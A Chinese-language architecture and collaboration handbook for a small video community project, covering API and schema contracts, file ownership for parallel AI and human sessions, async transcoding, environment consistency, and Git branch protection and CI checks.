# 架构与多执行者协作手册

> 这份文档的目标不是「规定怎么做」，而是**支撑讨论**：讲清每个选择的原理、代价和失败方式，让你在没有我在场时也能自己判断。
>
> 读者设定：懂技术、能读代码，但不是专业后端。所以每个判断都会给「什么条件下结论会变」的反例。
>
> 适用对象：这个视频社区项目本身（单人维护、可能多机部署、多个 AI 执行会话并行）。

---

## 0. 先约定几个词

后面反复出现，先对齐含义，避免讨论时各说各的。

| 词 | 含义 | 在本项目里对应什么 |
| --- | --- | --- |
| **执行者** | 能独立读代码、改代码、提交改动的实体。可以是人，也可以是一个 AI 会话 | 你本人、本机的一个 AI 会话、另一台云电脑上的 AI 会话 |
| **工作区** | 一份磁盘上的代码副本（含 `.git` 和 `node_modules`） | 每台机器各自的工作区 |
| **契约** | 两个部分之间约定好的、双方都必须遵守的形状。改它就会同时影响两边 | API 的请求/响应结构、数据库表结构、共用 TypeScript 类型 |
| **状态** | 会影响下一次请求结果的数据 | 登录态、上传的视频文件、转码任务、缓存 |
| **无状态化** | 让某个进程不持有「只有它自己知道」的状态，从而可以随便复制、重启、换机器 | 应用容器不把会话和文件放本地内存/磁盘 |

一个贯穿全文的判断标准：**任何「只有某台机器/某个进程知道」的东西，都会在你扩容、重启、换机器时变成 bug。** 这句话几乎能推出后面所有结论。

## 1. 契约先行

### 1.1 原理：为什么需要「单一来源」

三个部分协作时，任何一方都要知道另一方的形状：

- 前端要知道接口返回什么字段；
- 后端要知道数据库有什么列；
- 转码 worker 要知道稿件状态有哪些取值。

只要这个「形状」存在于**两个地方**（例如前端手写一份类型、后端手写一份返回结构），它就必然会在某次改动后不一致。这不是纪律问题，是**信息复制必然漂移**：任何需要人工同步的副本，最终都会不同步。

所以原则只有一句：**每种契约只能有一个「源头」，其他所有地方都从源头派生，或者由机器检查是否一致。**

### 1.2 三类契约分别怎么管

#### (a) 数据库 schema 与迁移

**源头**：`prisma/schema.prisma`（本地） → 生产用 `prisma migrate` 产出的迁移文件。

**派生**：`@prisma/client` 生成的类型。任何手写的 `type Video = {...}` 都是第二份真相，应该删掉。

**本项目现状**：`db/schema.postgres.sql` 是**设计草案**，`prisma/schema.prisma` 是**可执行真相**。这两份**必然**会漂移——这是已知的技术债，处理方式是：把 SQL 文件明确标注为「文档，不参与运行」，并且在切 PostgreSQL 时以 Prisma 迁移为准重新生成它，或者干脆删掉它。**两份都能执行 = 一定有一份是错的。**

**漂移剧本（真实会发生）**：

> 你在 PostgreSQL 草案里给 `videos` 加了 `is_original boolean`，顺手在 `schema.prisma` 里也加了一个 `isOriginal Boolean`。三周后你想加「转载来源」字段，只改了 Prisma，忘了 SQL 文件。半年后你按 SQL 文件建库，发现少了三个字段，然后开始怀疑是迁移没跑——排查时间是加字段时间的 20 倍。

**怎么防**：要么让文档彻底不参与运行（推荐），要么写一个脚本从 `schema.prisma` 反向生成 SQL 草案（成本高，个人项目不值得）。

#### (b) 接口定义

**源头选择**（从轻到重）：

| 方案 | 做法 | 适用 | 代价 |
| --- | --- | --- | --- |
| 类型即契约 | 在 `src/lib/contracts.ts` 里定义请求/响应的 zod schema，路由处理函数用它做**运行时校验**，前端从 `z.infer` 取类型 | 个人项目、消费方只有自己的前端 | 需要多写几十行 schema |
| OpenAPI | 手写/生成 `openapi.yaml`，前端用生成器出客户端 | 有第三方消费方（移动端、别人接入） | 生成器配置 + 版本对齐是长期负担 |
| tRPC | 后端定义过程，前端直接调用，类型自动贯通 | 同仓、同语言、只有自家前端 | 绑定 TypeScript，对外提供 API 时要再加一层 |
| 什么都不做 | 前后端各写各的 `interface` | 一次性脚本、原型 | 见下面的剧本 |

**本项目的现实**：目前是「什么都不做」的轻量版——前端类型直接从 `src/lib/queries.ts` 里 `import type`，因为同仓同语言。这在**单仓、单语言、无外部消费方**时是合理的最小方案。但一旦出现下面任一情况，就该升级成 zod：

- 有第二个进程（转码 worker、定时任务）需要读写同一批数据；
- 有非 TypeScript 的消费方（脚本、移动端）；
- 你开始在不同会话里「凭记忆」写请求体。

**漂移剧本**：

> 会话 A 把 `/api/danmaku` 的 `timeSec` 从「整数秒」改成「毫秒」，因为播放器里取的是 `currentTime * 1000`。会话 B 同时在写「按时间窗拉弹幕」的接口，仍然按秒计算。两边都自测通过，上线后弹幕全部集中在视频开头 20 秒内。表现像「弹幕爆炸」，实际是单位不一致。

这类 bug 的特征：**两边都没错，接口没说清**。单位、空值、分页语义、时间时区，是四个最高频的漂移点。

#### (c) 共用类型

**规则**：类型只能从源头派生，禁止「复制一份改一改」。

- 数据库实体：从 Prisma 生成类型派生（`Prisma.VideoGetPayload<{...}>`）。
- 接口 DTO：从 zod schema 派生。
- 前端展示模型：允许独立定义，但必须**显式转换**（写一个 `toFeedItem()`），不允许把 ORM 对象直接扔给组件。

为什么允许展示模型独立？因为页面需要的字段和数据库字段天然不同（例如首页不需要 `authorId`，但需要 `author.displayName`）。关键区别是：**展示模型是「转换」的结果，而不是「复制」的数据库结构**。前者在字段改名时会编译报错，后者不会。

### 1.3 反例：什么时候不必契约先行

- 一次性的数据导入脚本：写完就删，不值得建 schema。
- 纯探索阶段的 UI 原型：先画出来再定数据形状是合理的，但这个阶段的代码不要合进主干。

判断标准：**这段代码会活过两周吗？** 会，就值得有契约；不会，就别浪费。

## 2. 所有权矩阵

### 2.1 原理

多个执行者并行时，冲突来自两个地方：

1. **写冲突**：两个会话改同一个文件的同一段，Git 合并时冲突。
2. **语义冲突**：改的是不同文件，但互相破坏（A 改了数据结构，B 的查询没跟着改）。合并干净，运行报错。

所有权矩阵主要解决第 1 类。第 2 类只能靠契约 + 自动化检查（第 7.3 节）。

**划分依据**：按**文件路径**划分，不按「功能」划分。因为 Git 的冲突检测是文件级的——两个人改「首页功能」但落在同一个 `page.tsx`，照样冲突；两个人改「不同分区」但落在不同文件，永远不冲突。

### 2.2 本项目的所有权矩阵（建议）

| 路径 | 归属 | 理由 | 并行安全 |
| --- | --- | --- | --- |
| `prisma/schema.prisma`、`prisma/migrations/` | **共享层（串行）** | 一个迁移顺序错了全库乱；并行加迁移必然产生分叉历史 | ❌ 只能一个执行者改 |
| `src/lib/`（db/auth/queries/http） | **共享层（串行）** | 所有页面都依赖，签名一改全站崩 | ⚠️ 改签名要串行，加新函数可并行 |
| `src/app/layout.tsx`、`src/app/globals.css` | **共享层（串行）** | 全站视觉与导航，任何两个会话同时改必冲突 | ❌ |
| `next.config.ts`、`tsconfig.json`、`package.json`、锁文件 | **共享层（串行）** | 配置是全局的；锁文件几乎每行都会冲突 | ❌ |
| `src/app/page.tsx`（首页） | 执行者甲 | 页面级独占 | ✅ |
| `src/app/watch/[id]/page.tsx` + `src/components/Player.tsx` | 执行者乙 | 播放器是最大的耦合块，独占最安全 | ✅ |
| `src/app/studio/page.tsx` + `UploadForm.tsx` | 执行者丙 | 上传链路自洽 | ✅ |
| `src/app/api/**` | 按资源分：`api/videos/*` 甲、`api/danmaku/*` 乙 | 路由文件天然按资源隔离 | ✅ |
| `docs/`、`PLAN.md` | 谁写谁有，但同文件不并行 | 文档冲突不致命，但会浪费合并时间 | ⚠️ |
| `scripts/` | 共享层（低频） | 构建脚本改坏影响所有人 | ⚠️ |

### 2.3 必须串行、只能一个线程改的文件

按冲突频率从高到低（这也是你排查合并冲突时的优先级）：

1. **`package-lock.json`**——几乎每次装包都改，两个会话同时装依赖，合并冲突是逐行比对哈希，人工基本无法解决。**对策：依赖变更由一个执行者统一做，其他人只 pull 不装。**
2. **`prisma/migrations/*`**——文件名带时间戳，两边各自生成就是两条分叉的迁移链。**对策：迁移只能串行；并行需求先约定好谁来写，另一个等合并后再写。**
3. **`src/app/globals.css`**——设计 token 与全局样式，任何 UI 会话都会碰。**对策：token 层冻结，新样式只写在组件内（Tailwind class），不往全局加。**
4. **`src/lib/queries.ts`**——所有页面的数据入口，加字段是常态。**对策：只追加、不改已有函数签名；改签名必须单独一个 PR。**
5. **`src/app/layout.tsx`**——导航、页脚。**对策：改布局前先在群里/交接文档里说一声。**
6. **`next.config.ts` / `tsconfig.json`**——低频但影响全局。**对策：串行，且合并后必须全量构建一次。**
7. **`src/components/VideoCard.tsx`**——多个页面共用。**对策：视为共享组件，改动要兼容所有调用方（不改 props 名字）。**

### 2.4 怎么强制执行

- 用 `CODEOWNERS` 把共享层指向「一个负责人」（第 7.4 节）。GitHub 上，非 owner 的 PR 需要 owner 批准才能合并——即使 owner 是同一个人的另一个账号，这个门也会强迫你「停下来确认」。
- 用 CI 检查 `prisma/migrations` 是否出现分叉（第 7.3 节）。
- 用 PR 模板里的「改动范围」一栏，要求列出碰到的共享文件；评审时只看这些。

### 2.5 反例：常见错误划分方式

- **按功能划分**（「你负责弹幕功能，我负责播放功能」）：两者都要改 `Player.tsx`，冲突照样发生，而且是最痛的那种——同一段渲染逻辑被两套思路改。
- **按层划分**（「你写后端，我写前端」）：接口契约变成两个会话的中间地带，漂移率最高。
- **按时间划分**（「你先改两小时，我再改」）：等于串行，浪费并行度，且没法验收。

正确姿势是**按文件所有权划分，共享文件显式串行**。

## 3. 单体 / 模块化单体 / 微服务

### 3.1 三个词的实际差别

| 形态 | 部署单元 | 边界靠什么维持 | 一句话 |
| --- | --- | --- | --- |
| 单体 | 1 个进程 | 只靠代码目录，没有强制 | 改起来最快，烂起来也最快 |
| 模块化单体 | 1 个进程 | 目录 + 约定（禁止跨模块 import 内部文件） | 绝大多数项目的正确选择 |
| 微服务 | N 个进程 | 网络调用 + 契约 + 独立数据库 | 用运维复杂度换独立伸缩与独立失败域 |

注意：**模块化单体在物理上仍然是单体**。它不是「折中方案」，而是「把未来的拆分成本提前降到最低」的一种组织方式。判断它是否成功，看一条：**能不能在不改业务代码的前提下，把某个模块搬到独立进程。** 如果模块只通过定义好的接口（函数调用 → 未来换成 HTTP/队列）访问其他模块，就能搬；如果到处直接 `prisma.video.update`，就搬不动。

### 3.2 本项目的推荐：模块化单体（就是当前骨架的形态）

理由不是「简单」，而是**这个项目的三个具体条件**：

1. **一个人维护**。微服务的成本（服务发现、链路追踪、分布式事务、多套部署配置）是**固定成本**，不会因为流量小而降低。一个人的注意力是真正的瓶颈。
2. **多机 ≠ 微服务**。多台机器跑同一个镜像，仍然可以是单体。多机的需求是「无状态 + 共享存储」，不是「拆服务」。
3. **视频站的耦合点很紧**。上传完成 → 建稿 → 转码 → 更新状态 → 首页可见 → 播放页可播，这条链跨越了存储、数据库、计算。拆成服务后，每一步都变成「可能超时的网络调用」，而你要为每个调用设计重试与补偿。

**唯一的例外已经在骨架里体现了**：转码天然适合拆出去。原因是它的资源画像和应用完全不同——ffmpeg 吃满 CPU 几十秒到几分钟，而 Web 请求只需要几十毫秒。放在同一个进程里，一个用户上传就能让整站卡住。所以「转码 worker」是第一个该拆出去的模块，**即使你还是单体**。

### 3.3 为什么不是另外两条

**为什么不是「直接上微服务」**：
- 分布式事务：稿件状态和文件产物必须一致。单体里是「一个事务 + 一次文件写入」；微服务里是「两个服务 + 一个消息 + 补偿逻辑」。
- 可观测性门槛：单机看一个日志文件就能定位；微服务没有 request id 贯穿和集中日志，你连「请求经过了哪几个服务」都不知道。
- 部署成本：5 个服务 = 5 个镜像 + 5 份配置 + 5 套健康检查 + 版本兼容矩阵。
- **反例（什么条件下这个结论会变）**：如果转码量增长到需要 10 台机器专跑转码，而 Web 只需要 1 台，那么继续放在一起就是浪费——这时候拆 worker 不是「架构先进」，是「账单要求」。

**为什么不是「纯单体、什么都不分」**：
- 不是不行，而是会失去「未来能拆」的选项。当转码把事件循环堵死时，你唯一的办法是加班改代码。
- 模块化单体的额外成本很低：几个目录 + 一条约定 + 一次代码评审。这种低成本保险值得买。

### 3.4 模块怎么划（在本项目里）

按**变化原因**划，不按技术层划：

```
src/modules/
├── auth/        # 注册、登录、会话。变化原因：登录方式变了
├── catalog/     # 视频、分区、标签、信息流。变化原因：内容组织方式变了
├── playback/    # 播放源、清晰度、进度。变化原因：播放协议变了
├── social/      # 评论、弹幕、点赞、收藏、关注。变化原因：互动玩法变了
├── studio/      # 上传、转码编排、稿件状态。变化原因：生产流程变了
└── moderation/  # 审核、举报。变化原因：治理策略变了
```

约定：
- 模块对外只暴露 `index.ts`（或 `service.ts`）里的函数；
- 模块内部可以直接用 `prisma`，但**跨模块只能调对方的公开函数**；
- 跨模块禁止直接读对方的表。这一条是拆分可行性的关键——如果 `catalog` 直接 join `moderation` 的表，将来把它们分开就做不到了。

当前骨架为了“能一眼看懂”，页面直接调 `prisma`，还没有模块目录。这是**有意的简化**：在页面数量 < 10 时，模块化的收益低于它带来的跳转成本。什么时候该建：当同一个查询在 3 个页面重复出现时（现在 `getFeed` 已经承担了这个角色）。

### 3.5 什么时候才该真的拆服务

四个信号，出现任意两个再动手：

1. **资源画像冲突**：某部分吃 CPU/内存/IO 的方式与其他部分完全不同（本项目的转码就是）。
2. **独立伸缩需求**：某部分的副本数需要与整体差一个数量级。
3. **独立失败域**：某部分挂了不应该影响主站（例如搜索挂了，首页仍应可用）。
4. **独立发布节奏**：某部分需要每天发版，其余每周一次。

**不应该作为拆服务理由的**：「看起来更专业」「以后可能要」「团队按服务划分」。这三条都是把未来的想象变成现在的债。

## 4. 无状态化的落地细节

### 4.1 原理：状态在哪里，决定了你能不能横向扩展

一个进程「有状态」的意思是：它记得一些东西，而这些记忆不在这台机器之外。

- 单机：进程内存就是真相，重启丢失可以接受（用户重新登录一次）。
- 多机：请求可能落到任意一台。如果登录态在 A 机器的内存里，用户下一次请求打到 B，就变成未登录。

所以横向扩展的前提不是「多开几个容器」，而是**把状态从进程里搬出去**。

### 4.2 四类状态分别放哪

| 状态 | 放哪（推荐） | 备选 | 放错的后果 |
| --- | --- | --- | --- |
| **会话** | 数据库 `sessions` 表（本项目已这样）+ Cookie 只存随机 token | Redis（更常见的做法，性能更好） | 放内存 → 重启全员掉线；多机 → 随机掉线，且现象像是「登录有时有效有时无效」，极难排查 |
| **缓存** | Redis（单实例足够） | 进程内 LRU（只适合「丢了也无所谓」的数据） | 进程内缓存用户信息 → 改了昵称，不同机器看到不同结果 |
| **文件** | 对象存储（S3/MinIO） | 本地磁盘 + 静态服务（仅单机） | 放应用容器本地 → 上传到 A，B 机器 404；容器重建 → 文件全丢（本项目骨架就是这个状态，见 4.4） |
| **队列** | Redis（BullMQ）或数据库表 | 数据库表做简单队列（`FOR UPDATE SKIP LOCKED`） | 放内存 → 重启丢任务；多机 → 任务只在收到它的那台执行 |

### 4.3 五个「悄悄破坏水平扩展」的隐式状态

这些最危险，因为它们在单机上完全正常。

1. **内存里的计数器/排行榜**：`viewCount` 先 `++` 在内存，定时刷库。单机完美，双机时两个进程各自计数、互相覆盖。
2. **进程内的定时任务**：`setInterval` 每 5 分钟清理过期会话。双机时两台同时跑，重复执行（如果操作幂等就没事，不幂等就出事，例如「每分钟给用户加 1 硬币」）。
3. **本地临时目录做中转**：上传先写 `/tmp`，转码后移到存储。多机时「上传请求在 A，转码队列被 B 消费」，B 找不到 `/tmp` 里的文件。
4. **内存里的「正在处理」集合**：防重复提交的 `Set<userId>`。重启丢失，多机不共享。
5. **依赖本地时区的业务逻辑**：「今天」是按服务器本地时区算的。容器默认 UTC，Mac 是 Asia/Shanghai，于是「每日签到」在不同环境有 8 小时偏差。**所有时间戳存 UTC，展示层再转。**

**判断方法**：问自己「如果这个进程此刻被杀掉，再在另一台机器上起来，会发生什么？」如果答案是「用户会看到不一致」，那就是隐藏状态。

### 4.4 本项目的现状与差距

| 项 | 现状 | 单机是否可行 | 多机是否可行 |
| --- | --- | --- | --- |
| 会话 | DB `sessions` 表 | ✅ | ✅ |
| 上传文件 | 本地 `storage/media/` | ✅ | ❌ 必须换对象存储 |
| 转码 | 请求内同步执行 | ⚠️ 会让请求挂几十秒 | ❌ |
| 播放进度 | 浏览器 localStorage | ✅ | ✅（但不跨设备） |
| 计数 | DB 自增 | ✅ | ✅ |
| 媒体 URL | `/media/{uuid}/...` 由应用进程提供 | ✅ | ❌ 如果文件只在某一台机器上 |

这张表就是「何时才能加第二台机器」的清单：**对象存储和转码 worker 是前置条件**。

### 4.5 一个常被忽略的点：粘性会话

「让负载均衡按用户 IP 固定打到同一台机器」看起来能解决会话问题。代价是：

- 某台机器挂了，上面的用户全部掉线；
- 发布新版本时无法做到真正的滚动更新（旧机器上的用户不会被迁移）；
- 机器之间的负载永远不均匀。

粘性会话是**把架构问题变成了运维问题**。它能用，但要知道自己在付什么代价。

## 5. 异步与队列

### 5.1 为什么转码必须异步

同步转码（当前骨架做法）的问题不是「慢」，而是：

1. **请求生命周期 = 用户等待时间**。用户关掉页面，请求可能被中断，转码半途而废，留下半个文件。
2. **无法重试**。失败了只能让用户重新上传，而不是「自动重跑一次」。
3. **资源争抢**。一个 4K 视频的转码会占满 CPU，此期间所有页面请求变慢——用户会觉得「网站卡了」，而实际上他在等别人的视频转完。
4. **超时**。反向代理、CDN、网关都有自己的请求超时（通常几十秒到几分钟），超时后用户看到 504，但服务端其实还在跑。

异步化之后，请求只负责「存文件 + 建记录 + 投递任务」，几百毫秒返回。

### 5.2 转码流水线的状态机

```
[上传完成] → uploaded
    ↓ 投递任务（消息里只带 videoId 和参数，不带文件内容）
  queued → processing（percent 0→100，stage: probe/cover/720p/480p）
    ↓
  ready（全部产物就绪，status=published）
    ↓ 任一步失败且不可重试
  failed（记录失败原因，进死信队列，等人工处理）
```

**关键设计**：任务消息里只放**标识符**，不放文件。文件通过存储地址访问。原因：消息队列不适合传大对象（内存、持久化、重放成本都会爆炸）。

### 5.3 幂等：同一个任务跑两次，结果必须一样

为什么一定会有「跑两次」：worker 崩溃后消息被重新投递；网络抖动导致确认丢失；人工重试。

做法：

- **输出路径确定化**：`storage/{videoId}/720p.mp4`，不要用随机名。重跑就是覆盖同一个文件。
- **状态更新用条件写**：`UPDATE videos SET status='processing' WHERE id=? AND status IN ('queued','processing')`，返回受影响行数为 0 就说明已被别的 worker 接管，直接退出。
- **计数类操作不要放在任务里**：任务里「播放数 +1」在重试时会重复加。
- **外部副作用要能识别**：调用第三方接口前先查「是否已执行」（用一张 `job_runs` 表记录 key）。

**反例**：「转码完成后给作者发一封通知邮件」。重试 3 次，作者收到 3 封。修法：以 `(videoId, 'published-notified')` 为唯一键插入记录，插入成功才发。

### 5.4 失败与重试

区分两类错误：

| 类型 | 例子 | 策略 |
| --- | --- | --- |
| 可重试（瞬时） | 磁盘暂时满、对象存储 5xx、进程被 kill | 指数退避重试 3–5 次 |
| 不可重试（永久） | 源文件损坏、格式不支持、ffmpeg 参数错误 | 立即失败，标记 `failed`，把 stderr 摘要写进 DB |

**死信队列（DLQ）**：重试耗尽的任务进 DLQ，不要把消息直接删掉。个人项目里 DLQ 的「界面」可以就是一张表 + 一个管理页，但**必须有**，否则失败任务是静默的。

**进度回传**：进度写数据库字段（`percent`、`stage`），前端轮询 `/api/videos/{id}/status`。不要只写日志——用户看不到日志。

### 5.5 多 worker 的扩缩容

- worker 必须无状态：只依赖「数据库 + 队列 + 对象存储」三样东西。
- **并发度不要按 CPU 核数拉满**：ffmpeg 自己会多线程。1 个 worker 进程同时跑 1–2 个转码任务，通常比同时跑 8 个更快（总完成时间）。
- 扩容是「再启动一个同样的容器」，缩容是「优雅退出」：收到 SIGTERM 后停止取新任务，把当前任务做完或标记为可重试，再退出。
- 任务超时必须有上限（例如 30 分钟），否则一个卡死的 ffmpeg 会永远占着 worker。

### 5.6 从「同步」迁移到「队列」的最小改动

1. 上传接口末尾：`await transcode(...)` → `await queue.add('transcode', { videoId })`；
2. 新建 `worker.ts`，消费任务，执行原来的函数；
3. 状态字段加 `queued`，前端根据状态展示「排队中 / 转码中 / 已发布」；
4. 部署时多一个进程（compose 里再加一个 service）。

业务代码几乎不用改——这就是当初把转码写成独立函数（`src/lib/media.ts`）的价值。

## 6. 环境一致性

### 6.1 为什么这是多机协作里最容易踩的坑

「在我机器上是好的」不是态度问题，是**环境差异**。多执行者场景下，最贵的时间花在「A 机器能跑，B 机器报错」上。

### 6.2 macOS 与 Linux 的差异清单（本项目相关）

| 差异 | 具体表现 | 在本项目里会不会撞上 |
| --- | --- | --- |
| 文件系统大小写 | macOS 默认大小写不敏感，Linux 敏感 | ✅ `import './Player'` 与文件 `player.tsx` 在 Mac 正常，Linux 构建失败 |
| 换行符 | Windows CRLF vs Unix LF | ⚠️ 多人/多工具提交时出现「整个文件都改了」的假 diff |
| 文件权限 | Linux 有可执行位，macOS 上 git 也能记录但容易被忽略 | ✅ `scripts/*.sh` 在 Linux 上 `Permission denied` |
| 路径拼接 | 反斜杠 / 正斜杠 | ✅ 已用 `path.join` 规避，不要手拼字符串 |
| BSD 工具 vs GNU 工具 | `sed -i`、`date -d`、`stat -f/-c` 参数不同 | ✅ 脚本里避免依赖这些参数 |
| ffmpeg 编码器 | 不同版本/发行版的 `libx264`、硬件加速支持不同 | ✅ 同一个参数在一台机器能跑，另一台报「Unknown encoder」 |
| 原生模块编译 | `sharp`、`better-sqlite3` 需要匹配 Node ABI | ✅ `npm ci` 在另一台机器可能要重新编译 |
| Node 版本 | 同一项目不同 Node 大版本，行为不同 | ✅ 必须锁版本 |
| 时区 | 容器默认 UTC，本地是中国时区 | ✅ 「今天」类逻辑出错 |

### 6.3 容器化与版本锁定

**锁什么**：

- Node 版本：`.nvmrc` + `Dockerfile` 里 `FROM node:22-alpine` 这种**明确大版本**；`package.json` 里 `"engines"` 兜底。
- 依赖：**必须提交 `package-lock.json`**，并用 `npm ci`（而不是 `npm install`）安装。`npm ci` 会严格按锁文件装，装完不一致就报错——这正是你要的。
- ffmpeg 版本：Docker 镜像里固定（例如 `jrottenberg/ffmpeg:6.1` 或自己基于 alpine 装 `ffmpeg=6.1.x`），不要在宿主机上依赖 `brew install ffmpeg`。
- 数据库版本：`postgres:16` 精确到主版本，升级视为一次独立变更。

**镜像怎么分**：`deps` → `builder` → `runner` 三阶段。builder 里编译和构建，runner 只带运行需要的文件。这样做的实操价值是：**镜像小 → 上传快 → 回滚快**。

**反例（什么条件下不该容器化）**：
- 你只想在自己 Mac 上跑，容器化会让你每次改代码都要重建镜像，开发体验反而变差。
- 这时正确做法是「本地原生跑开发服务器，部署时用容器」。两套环境允许不同，但**依赖版本必须一致**（都吃同一份 lock 文件）。

### 6.4 bootstrap 脚本该干什么

新机器（或新执行会话）第一次进入项目，应该一条命令到达「能跑」：

```
scripts/bootstrap.sh
├── 1. 检查 Node 版本是否满足 .nvmrc（不满足直接报错退出，不要自动升级）
├── 2. 检查 ffmpeg 是否存在（不存在时给出警告，明确「转码能力降级」而不是失败）
├── 3. npm ci（严格按锁文件）
├── 4. 复制 .env.example → .env（已存在则跳过，绝不覆盖）
├── 5. npx prisma db push（或 migrate deploy）
├── 6. 生成示例媒体（幂等：已存在则跳过）
├── 7. 可选 seed（已有数据则跳过）
└── 8. 打印「下一步：npm run dev」+ 演示账号
```

三条原则：**幂等**（重复跑不炸）、**可跳过**（每一步都有明确的跳过条件）、**失败要说人话**（「Node 版本是 18，需要 22」而不是 `engine mismatch`）。

## 7. 多执行者协作机制（Git 协作方案）

> 这一节按「照做能配好」的标准写。**不涉及对你现有远程仓库的任何改动**，所有操作都需要你自己执行。

### 7.1 Fork 与分支的适用边界

先分清两种并行：

| 模式 | 适用 | 前提 |
| --- | --- | --- |
| **分支（branch）** | 执行者能访问同一个远程仓库、有写权限 | 每个执行者有自己的工作区（各自 clone），但推送到同一个仓库的不同分支 |
| **Fork** | 执行者**无法**共享仓库权限（外部 AI、别人的账号、临时协作者） | 平台层面复制一份仓库到对方账号下，通过 PR 回流 |

**判断规则**：

- 能给你加 collaborator、且你信任它能推分支 → 用分支。**成本最低**，因为分支和主干在同一个仓库里，可以互相 rebase/merge，CI 也共享。
- 不能给权限（你不想把仓库写权限发给一个外部 AI 的账号）→ 用 Fork。代价见下。

**为什么跨 fork 合并是成本最高的动作**：

1. **历史不共享**：fork 之后两边的 commit 图完全分叉，无法 `rebase`，只能 `cherry-pick` 或整段 merge。冲突解决没有「共同祖先」帮忙。
2. **同步是单向且需手动**：上游更新了 schema，你的 fork 不会自动拿到，必须手动 `git fetch upstream && git merge upstream/main`，而这一步经常出现「为了同步而产生的冲突」。
3. **CI 默认不在 fork 上跑**（安全原因），所以「我这边测试过了」通常不可信。
4. **权限与密钥受限**：fork 的 PR 拿不到 secrets（第 7.5 节），所以依赖密钥的检查在 fork PR 上要么跳过、要么需要维护者重新触发。
5. **代码所有权割裂**：fork 里的改动可能是基于过期的契约写的，合并时才发现接口早就改了。

**跨 fork 同步的标准操作**（fork 方执行）：

```bash
git remote add upstream https://github.com/<owner>/<repo>.git   # 只做一次
git fetch upstream
git checkout main
git merge upstream/main            # 或 git rebase upstream/main
git push origin main
```

维护者合并 fork PR 时，优先让 fork 方**先同步并解决冲突**，而不是维护者在本地解决——因为冲突的语义只有写代码的人最清楚。

**减少 fork 成本的三条实践**：
- fork PR 尽量**小且短命**（几天内合并），长期分叉的 fork 基本等于重写；
- fork 方不要在 fork 里改共享层（`schema.prisma`、`package-lock.json`），这些改动回流冲突率最高；
- 约定 fork 必须基于最近 N 天内的 `upstream/main`，PR 模板里要求粘贴「已同步到 commit xxx」。

### 7.2 远程仓库的保护配置

**默认分支（main）必须开的规则**：

| 规则 | 作用 | 不开的后果 |
| --- | --- | --- |
| Require a pull request before merging | 禁止直接 push main | 任何执行者一次手滑就污染主干，且没有评审记录 |
| Require approvals ≥ 1 | 至少一次人工/owner 确认 | 与上一条配合才有意义（自审可配 `dismiss stale approvals`） |
| Require status checks to pass | 合并前必须绿 | 类型错误、构建失败直接进主干 |
| Require branches to be up to date | 合并前必须先 rebase 到最新 main | 见下面的「各自通过、合并后互破」 |
| Require conversation resolution | 评审意见必须处理 | 意见被忽略 |
| Do not allow bypassing（包含管理员） | owner 也不能绕过 | 规则形同虚设 |
| Restrict force pushes / deletions | 禁止强推与删分支 | 历史被改写，别人 rebase 全乱 |
| Require linear history（可选） | 禁止 merge commit | 历史更干净，但要求所有人用 rebase/squash |

**「两个 PR 各自通过，合并后互相破坏」是怎么发生的**：

> PR-A 把 `Video.status` 的取值从 `processing` 改成 `transcoding`；
> PR-B 新增一个查询 `where: { status: 'processing' }`。
> 两个 PR 都基于同一个旧 main，各自的 CI 都是绿的（因为对方的改动不在自己的分支里）。先合 A 再合 B：B 的代码编译通过、测试通过（测试里没有这个查询），但线上「转码中的稿件」列表永远为空。

成因有三层：
1. **CI 只验证「分支 + 旧 main」，不验证「分支 + 新 main」**——这需要 `Require branches to be up to date` 或合并队列。
2. **测试覆盖不到语义耦合**——类型系统能拦住字段改名，拦不住「魔法字符串改了值」。
3. **PR 之间没有声明依赖**——B 不知道 A 在改同一个语义。

**对策（按成本从低到高）**：
- 开启 `Require branches to be up to date before merging`：合并前必须 rebase 到最新 main 并重跑 CI。这能拦住大部分，代价是高频合并时大家不停 rebase。
- **合并队列（merge queue，GitHub 原生支持）**：把「分支 + 最新 main + 前面排队的分支」组成一个临时分支跑 CI，绿了再合并。它解决的是「A 合了之后 B 的绿是假的」这个问题。个人项目如果合并频率低于每天 2 次，收益不明显，可以不开。
- **把魔法字符串变成枚举**：`status` 用 Prisma enum（PostgreSQL）或共享常量，改值时全局搜索得到，编译器也能发现漏改。这是最根本的解法。
- **PR 描述里写「影响范围」**：注明「修改了 status 枚举值」，让另一个 PR 的作者知道要同步。

### 7.3 CI 检查项清单

每一项都要说清「能拦住什么 / 拦不住什么」，否则会误以为「CI 绿 = 没问题」。

| 检查 | 命令示例 | 能拦住 | 拦不住 |
| --- | --- | --- | --- |
| **类型检查** | `npx tsc --noEmit` | 类型不匹配、字段改名后漏改的引用、拼错的属性名 | 运行时数据形状错误（例如接口返回 `null` 但类型写的是非空）、单元语义错误 |
| **构建** | `npm run build` | 服务端/客户端边界错误、缺失的环境变量在构建期报错、路由冲突 | 只在特定数据下才出现的运行时错误 |
| **Lint** | `npm run lint` | 未使用变量、hooks 依赖缺失、可疑的 `==` | 逻辑错误、性能问题、架构违规（除非配了 `no-restricted-imports`） |
| **单元测试** | `npm test` | 纯函数、格式化、权限判断分支 | 需要数据库/浏览器的集成行为、并发问题 |
| **契约 diff** | 见下 | 接口字段删除/类型变更、schema 破坏性改动 | 语义变化（同名字段含义变了，如「秒」变「毫秒」） |
| **迁移线性检查** | 见下 | 迁移分叉、重复时间戳、已合并迁移被篡改 | 迁移内容本身的正确性（例如漏了索引） |
| **依赖锁一致性** | `npm ci` 成功 | `package.json` 与 lock 不一致 | 锁文件里被塞进可疑包（需要额外审计） |
| **格式检查** | `prettier --check` | 无意义的 diff 噪音 | 任何逻辑问题 |

**契约 diff 具体怎么做**（两条路，按成本选）：

1. **轻量版（推荐先做）**：CI 里跑 `npx prisma migrate diff --from-migrations ./prisma/migrations --to-schema-datamodel ./prisma/schema.prisma --exit-code`，非零就说明「schema 改了但没有对应迁移」。再加一个 PR 标签规则：改了 `schema.prisma` 必须同时改 `prisma/migrations/`，否则 CI 失败。
2. **完整版**：用 zod/OpenAPI 生成 JSON Schema，提交到仓库；CI 对比新旧 JSON Schema，检测「删除字段、类型变更、必填变可选」这类破坏性变更，并输出 diff 评论。

**迁移线性与不可改检查**（可以写成 30 行脚本）：

```
规则 1：prisma/migrations/* 的时间戳必须严格递增，且新迁移的时间戳晚于 main 上最大的那个。
         → 拦住：两个分支各自生成迁移造成的分叉链。
规则 2：main 上已经存在的迁移文件，PR 中不允许修改内容（只能新增）。
         → 拦住：改历史迁移导致「我本地能跑、生产已跑过所以不一致」。
规则 3：一个 PR 只允许新增一个迁移（除非是明确的合并迁移）。
         → 拦住：一次 PR 里塞 5 个迁移，回滚时无法定位。
```

